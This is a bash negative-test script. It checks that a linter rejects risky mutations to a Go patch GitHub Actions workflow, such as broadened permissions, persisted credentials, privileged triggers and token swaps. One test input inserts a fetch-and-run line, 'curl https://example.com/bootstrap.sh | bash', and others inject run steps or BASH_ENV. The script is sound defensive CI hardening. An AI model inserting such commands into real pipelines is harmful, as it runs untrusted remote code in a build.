#!/usr/bin/env bash
# Prove that material Go patch workflow boundary mutations are rejected.
set -euo pipefail
cd "$(dirname "$0")/.."

workflow=.github/workflows/go-patch.yml
scripts/lint-go-patch-workflow.sh "$workflow" >/dev/null

test_root=$(mktemp -d "${TMPDIR:-/tmp}/cwk-go-patch-workflow.XXXXXXXX")
cleanup() { rm -rf -- "$test_root"; }
trap cleanup EXIT

expect_rejected() {
  local label=$1 from=$2 source=$3 candidate=$test_root/workflow.yml
  cp -- "$source" "$candidate"
  if ! sed "$from" "$candidate" >"$candidate.tmp"; then
    echo "could not prepare workflow mutation: $label" >&2
    exit 1
  fi
  mv -- "$candidate.tmp" "$candidate"
  if scripts/lint-go-patch-workflow.sh "$candidate" >/dev/null 2>&1; then
    echo "Go patch workflow lint accepted forbidden mutation: $label" >&2
    exit 1
  fi
}

expect_insert_rejected() {
  local label=$1 marker=$2 addition=$3 source=${4:-$workflow}
  local candidate=$test_root/workflow.yml
  cp -- "$source" "$candidate"
  if ! awk -v marker="$marker" -v addition="$addition" '
    $0 == marker {
      print
      count = split(addition, lines, /\\n/)
      for (i = 1; i <= count; i++) print lines[i]
      inserted = 1
      next
    }
    { print }
    END { if (!inserted) exit 3 }
  ' "$candidate" >"$candidate.tmp"; then
    echo "could not prepare workflow insertion: $label" >&2
    exit 1
  fi
  mv -- "$candidate.tmp" "$candidate"
  if scripts/lint-go-patch-workflow.sh "$candidate" >/dev/null 2>&1; then
    echo "Go patch workflow lint accepted forbidden insertion: $label" >&2
    exit 1
  fi
}

expect_append_step_rejected() {
  local label=$1 addition=$2 candidate=$test_root/workflow.yml
  cp -- "$workflow" "$candidate"
  printf '%s\n' "$addition" >>"$candidate"
  if scripts/lint-go-patch-workflow.sh "$candidate" >/dev/null 2>&1; then
    echo "Go patch workflow lint accepted forbidden appended step: $label" >&2
    exit 1
  fi
}

expect_rejected "write permission in validator" 's/^      contents: read$/      contents: write/' "$workflow"
expect_rejected "persisted checkout credentials" 's/persist-credentials: false/persist-credentials: true/' "$workflow"
expect_rejected "unpinned checkout action" 's/actions\/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1/actions\/checkout@v7/' "$workflow"
expect_rejected "validation dependency removed" 's/needs: \[prepare, validate\]/needs: [prepare]/' "$workflow"
expect_rejected "proposal checks out PR head" 's/needs.prepare.outputs.base_sha/github.head_ref/' "$workflow"
expect_rejected "wildcard PR staging" 's/add-paths: go.mod/add-paths: ./' "$workflow"
expect_rejected "validation gate removed" '/\.\/scripts\/check\.sh security/d' "$workflow"
expect_rejected "workflow dispatch write permission" 's/^  contents: read$/  actions: write/' "$workflow"
expect_rejected "privileged PR trigger" 's/^  workflow_dispatch:$/  pull_request_target:/' "$workflow"
expect_rejected "unstable per-run branch" "s/codex\\/go-patch-\${{ needs.prepare.outputs.minor }}/codex\\/go-patch-\${{ github.run_id }}/" "$workflow"
expect_rejected "automatic merge option" 's/^          title:.*/          enable-auto-merge: true/' "$workflow"
expect_rejected "alternate pull-request token" "s/token: \${{ github.token }}/token: \${{ secrets.WRITE_TOKEN }}/" "$workflow"
expect_rejected "arbitrary SHA-shaped checkout revision" 's/3d3c42e5aac5ba805825da76410c181273ba90b1/1111111111111111111111111111111111111111/' "$workflow"
expect_rejected "runtime expression in toolchain cache input" "s/cache: true/cache: \${{ secrets.UNTRUSTED }}/" "$workflow"
expect_insert_rejected "injected command in required gate" '          ./scripts/check.sh full' '          curl https://example.com/bootstrap.sh | bash'
expect_append_step_rejected "additional run step" '      - run: echo injected'
expect_append_step_rejected "additional id and run step" $'      - id: injected\n        run: echo injected'
expect_append_step_rejected "additional pinned action" '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
github_expr='$'
minor_marker="          PATCH_MINOR: ${github_expr}{{ needs.prepare.outputs.minor }}"
expect_insert_rejected "runtime environment injection" "$minor_marker" '          BASH_ENV: /tmp/injected'
expect_insert_rejected "additional pull-request action input" '          add-paths: go.mod' '          command: ./scripts/untrusted.sh'
expect_insert_rejected "extra write permission" '      pull-requests: write' '      issues: write'

echo "Go patch workflow negative tests passed"
